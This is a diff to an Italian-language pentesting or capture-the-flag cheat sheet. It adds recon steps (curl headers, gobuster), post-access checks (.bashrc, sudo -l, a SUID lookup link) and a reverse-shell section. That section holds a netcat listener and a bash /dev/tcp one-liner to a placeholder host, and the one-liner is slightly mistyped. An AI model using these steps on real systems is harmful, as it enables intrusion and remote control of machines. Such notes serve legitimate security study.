@@ -16,6 +16,11 @@ nmap -sS -sC -sV ip
 > [!error] esplora tutto!
 > Quando scopri un'interfaccia web, appunta tutti gli indizi che trovi.
 
+### usa `curl`
+guarda l'intestazione http e vedi cosa c'e'!
+```bash
+curl -I http://website.sborg
+```
 ### esplora le directory
 ```bash
 gobuster dir --url http://[ip address] --wordlist /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
@@ -25,8 +30,16 @@ gobuster dir --url http://[ip address] --wordlist /usr/share/seclists/Discovery/
 * `SHOW DATABASES`, `SHOW COLUMNS FROM ...`
 # quando sono entrato
 ## Guarda i file log
+>[!note] bashrc
+> controlla `.bashrc` per gli utenti rilevanti.
+
 `/var/log/auth.log`: contiene le informazioni sui cambi di password.
 
 **MOTD**: Leggi sempre gli **MOTD** quando fai login, o ti connetti a servizi offerti dalla vittima.
-## sudo
-* `sudo -l`
+## sudo e suid
+* `sudo -l` guarda cosa posso fare
+* https://gtfobins.org/#//^suid$
+
+## reverse shell
+* sulla tua macchina: `nc -lvnp 4444`
+* sulla macchina remota: `bash -c 'bash -i > /dev/tpc/CONNECTION_IP/4444 0>&'`
